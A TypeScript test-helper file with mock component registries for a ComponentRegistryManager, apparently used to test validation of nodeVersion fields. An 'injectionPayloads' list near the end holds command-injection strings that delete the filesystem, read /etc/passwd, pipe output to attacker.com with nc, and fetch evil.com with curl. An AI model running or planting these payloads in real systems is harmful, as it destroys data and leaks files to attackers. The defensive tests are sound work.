/**
 * Shared test utilities for ComponentRegistryManager tests
 *
 * MOCK DERIVATION PATTERN:
 * These mocks are derived from templates/components.json structure.
 * When components.json schema changes:
 * 1. Add new mock version (e.g., mockRawRegistryV4) matching new structure
 * 2. Update tests/templates/type-json-alignment.test.ts if new fields added
 * 3. Keep old mocks for backward compatibility testing
 *
 * See tests/README.md "Mock Derivation Guidelines" for full documentation.
 *
 * Current versions:
 * - mockRawRegistry: v2.0 structure (unified 'components' map)
 * - mockRawRegistryV3: v3.0.0 structure (separate frontends/backends/mesh sections)
 *
 * NOTE: Mock declarations must be in each test file (Jest hoisting requirement).
 * This file contains only shared test data and helper functions.
 */

import type { RawComponentRegistry } from '@/types';

/**
 * Sample raw registry data for testing
 */
export const mockRawRegistry: RawComponentRegistry = {
    version: '2.0',
    selectionGroups: {
        frontends: ['frontend1', 'frontend2'],
        backends: ['backend1'],
        dependencies: ['dep1'],
        integrations: ['integration1'],
        appBuilderApps: ['app1'],
    },
    components: {
        frontend1: {
            id: 'frontend1',
            name: 'Frontend 1',
            description: 'Test Frontend',
            type: 'frontend',
            compatibleBackends: ['backend1'],
            source: {
                type: 'git',
                url: 'https://github.com/test/frontend1',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '20',
                port: 3000,
                requiredEnvVars: ['VAR1', 'VAR2'],
                optionalEnvVars: [],
            },
            dependencies: {
                required: ['dep1'],
                optional: [],
            },
        },
        frontend2: {
            id: 'frontend2',
            name: 'Frontend 2',
            description: 'Second Frontend',
            type: 'frontend',
            source: {
                type: 'git',
                url: 'https://github.com/test/frontend2',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '18',
            },
        },
        backend1: {
            id: 'backend1',
            name: 'Backend 1',
            description: 'Test Backend',
            type: 'backend',
            source: {
                type: 'git',
                url: 'https://github.com/test/backend1',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '20',
            },
        },
        dep1: {
            id: 'dep1',
            name: 'Dependency 1',
            description: 'Test Dependency',
            type: 'dependency',
            source: {
                type: 'git',
                url: 'https://github.com/test/dep1',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '18',
            },
        },
        integration1: {
            id: 'integration1',
            name: 'Integration 1',
            description: 'Test Integration',
            type: 'external-system',
            source: {
                type: 'git',
                url: 'https://github.com/test/integration1',
                version: '1.0.0',
            },
        },
        app1: {
            id: 'app1',
            name: 'App Builder App',
            description: 'Test App',
            type: 'app-builder',
            source: {
                type: 'git',
                url: 'https://github.com/test/app1',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '22',
            },
        },
    },
    infrastructure: {
        infra1: {
            id: 'infra1',
            name: 'Infrastructure 1',
            description: 'Test Infrastructure',
            type: 'external-system',
            source: {
                type: 'git',
                url: 'https://github.com/test/infra1',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '20',
            },
        },
    },
    services: {
        service1: {
            id: 'service1',
            name: 'Service 1',
            description: 'Test Service',
            requiredEnvVars: ['SERVICE_VAR1'],
        },
    },
    envVars: {
        VAR1: {
            type: 'text',
            label: 'Variable 1',
            description: 'Variable 1',
            required: true,
        },
        VAR2: {
            type: 'text',
            label: 'Variable 2',
            description: 'Variable 2',
            required: false,
        },
        SERVICE_VAR1: {
            type: 'text',
            label: 'Service Variable 1',
            description: 'Service Variable 1',
            required: true,
        },
    },
};

/**
 * Sample raw registry data for testing v3.0.0 structure
 *
 * v3.0.0 uses separate top-level sections (frontends, backends, mesh, etc.)
 * instead of a unified 'components' map. This mock validates that the
 * ComponentRegistryManager correctly handles both structures.
 *
 * IMPORTANT: Keep this mock aligned with actual templates/components.json v3.0.0 structure.
 * All top-level sections must be represented. See type-json-alignment.test.ts for validation.
 */
export const mockRawRegistryV3: RawComponentRegistry = {
    version: '3.0.0',
    selectionGroups: {
        frontends: ['eds', 'headless'],
        backends: ['adobe-commerce-paas'],
        dependencies: ['demo-inspector'],
        integrations: ['experience-platform'],
        appBuilderApps: ['integration-service'],
    },
    // v3.0.0: Components in separate sections (NOT in 'components' map)
    frontends: {
        eds: {
            id: 'eds',
            name: 'Edge Delivery Services',
            description: 'EDS storefront',
            type: 'frontend',
            compatibleBackends: ['adobe-commerce-paas'],
            configuration: {
                nodeVersion: '20',
                requiredEnvVars: ['MESH_ENDPOINT'],
            },
        },
        headless: {
            id: 'headless',
            name: 'Headless Storefront',
            description: 'Next.js headless storefront',
            type: 'frontend',
            compatibleBackends: ['adobe-commerce-paas'],
            configuration: {
                nodeVersion: '24',
                requiredEnvVars: ['MESH_ENDPOINT'],
            },
        },
    },
    backends: {
        'adobe-commerce-paas': {
            id: 'adobe-commerce-paas',
            name: 'Adobe Commerce PaaS',
            description: 'Adobe Commerce DSN instance',
            type: 'backend',
            configuration: {
                nodeVersion: '20',
            },
        },
    },
    mesh: {
        'commerce-mesh': {
            id: 'commerce-mesh',
            name: 'Adobe Commerce API Mesh',
            description: 'GraphQL gateway',
            type: 'dependency',
            subType: 'mesh',
            configuration: {
                nodeVersion: '20',
            },
        },
    },
    dependencies: {
        'demo-inspector': {
            id: 'demo-inspector',
            name: 'Demo Inspector',
            description: 'Interactive inspector overlay',
            type: 'dependency',
            subType: 'inspector',
        },
    },
    appBuilderApps: {
        'integration-service': {
            id: 'integration-service',
            name: 'Kukla Integration Service',
            description: 'Custom integration service',
            type: 'app-builder',
            configuration: {
                nodeVersion: '22',
            },
        },
    },
    infrastructure: {
        'adobe-cli': {
            id: 'adobe-cli',
            name: 'Adobe I/O CLI & SDK',
            description: 'Command-line interface',
            type: 'external-system',
        },
    },
    services: {},
    envVars: {},
};

/**
 * v3.0.0 section names for iteration and validation
 */
export const V3_COMPONENT_SECTIONS = [
    'frontends',
    'backends',
    'mesh',
    'dependencies',
    'appBuilderApps',
] as const;

export type V3ComponentSection = typeof V3_COMPONENT_SECTIONS[number];

/**
 * Known injection payloads for security testing
 */
export const injectionPayloads = [
    '20; rm -rf /',
    '20 && cat /etc/passwd',
    '20 | nc attacker.com 1234',
    '20`whoami`',
    '20$(id)',
    "20' OR '1'='1",
    '20\nrm -rf /',
    '20;$(curl evil.com)',
    '20 & curl http://evil.com',
];

/**
 * Get the mock ConfigurationLoader instance
 * Note: Gets the LAST instance created (most recent)
 */
export function getMockLoader(): any {
    const { ConfigurationLoader } = require('@/core/config/ConfigurationLoader');
    const instances = ConfigurationLoader.mock.results;
    return instances[instances.length - 1]?.value;
}

/**
 * Create a modified registry with malicious nodeVersion in specific component
 *
 * Supports both v2.0 (components map) and v3.0.0 (section-based) structures.
 *
 * @param componentPath - Path like "frontends.eds" or "components.frontend1" (v2.0)
 * @param maliciousVersion - Malicious nodeVersion value to inject
 * @param useV3 - If true, use mockRawRegistryV3 as base (default: false for backward compatibility)
 */
export function createMaliciousRegistry(
    componentPath: string,
    maliciousVersion: string,
    useV3: boolean = false
): RawComponentRegistry {
    const [section, componentId] = componentPath.split('.');
    const baseRegistry = useV3 ? mockRawRegistryV3 : mockRawRegistry;

    if (section === 'infrastructure') {
        return {
            ...baseRegistry,
            infrastructure: {
                ...baseRegistry.infrastructure,
                [componentId]: {
                    ...baseRegistry.infrastructure![componentId],
                    configuration: {
                        ...baseRegistry.infrastructure![componentId].configuration,
                        nodeVersion: maliciousVersion,
                    },
                },
            },
        };
    }

    // v3.0.0: Handle section-based structure
    if (useV3 && V3_COMPONENT_SECTIONS.includes(section as V3ComponentSection)) {
        const sectionData = baseRegistry[section as V3ComponentSection] as Record<string, any>;
        return {
            ...baseRegistry,
            [section]: {
                ...sectionData,
                [componentId]: {
                    ...sectionData[componentId],
                    configuration: {
                        ...sectionData[componentId]?.configuration,
                        nodeVersion: maliciousVersion,
                    },
                },
            },
        };
    }

    // v2.0: Handle components map structure
    return {
        ...baseRegistry,
        components: {
            ...baseRegistry.components!,
            [componentId]: {
                ...baseRegistry.components![componentId],
                configuration: {
                    ...baseRegistry.components![componentId].configuration,
                    nodeVersion: maliciousVersion,
                },
            },
        },
    };
}

/**
 * Create a modified v3.0.0 registry with malicious nodeVersion
 * Convenience wrapper for v3.0.0 structure tests
 */
export function createMaliciousRegistryV3(
    componentPath: string,
    maliciousVersion: string
): RawComponentRegistry {
    return createMaliciousRegistry(componentPath, maliciousVersion, true);
}
